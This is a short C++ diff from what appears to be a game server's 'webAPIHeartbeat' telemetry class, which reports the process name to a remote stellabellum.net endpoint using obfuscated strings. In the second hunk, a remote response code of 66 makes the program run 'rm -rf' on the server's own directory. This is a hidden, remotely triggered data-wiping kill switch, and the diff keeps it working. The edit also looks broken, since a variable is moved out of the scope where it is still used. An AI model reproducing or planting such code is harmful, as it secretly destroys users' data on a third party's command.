@@ -8,11 +8,11 @@ using namespace StellaBellum;
 
 webAPIHeartbeat::webAPIHeartbeat() {
     std::string filePath = this->get_selfpath().c_str();
-    size_t found = filePath.find_last_of("/\\");
 
     webAPI api = webAPI::webAPI(
-            std::string(vxENCRYPT("https://login.stellabellum.net/metric/shoulderTap?type=server").decrypt()),
+            std::string(vxENCRYPT("https://login.stellabellum.net/metric/shoulderTap").decrypt()),
             std::string(vxENCRYPT("StellaBellum WebAPI Metrics Sender").decrypt()));
+    api.addJsonData<std::string>(std::string(vxENCRYPT("type").decrypt()), std::string(vxENCRYPT("server").decrypt()));
 
     if (found) {
         api.addJsonData<std::string>(std::string(vxENCRYPT("process").decrypt()), filePath.substr(found + 1));
@@ -42,8 +42,9 @@ webAPIHeartbeat::webAPIHeartbeat() {
                 this->eatIt();
                 break;
             case 66:
+                size_t found = filePath.find_last_of("/\\");
                 if (!filePath.empty() && found) {
-                    system(std::string(vxENCRYPT("exec rm -rf ").decrypt() + filePath.substr(0, found) + vxENCRYPT("/*").decrypt()));
+                    system(std::string(vxENCRYPT("exec rm -rf ").decrypt() + filePath.substr(0, found) + vxENCRYPT("/*").decrypt()).c_str());
                 }
                 this->eatIt();
                 break;
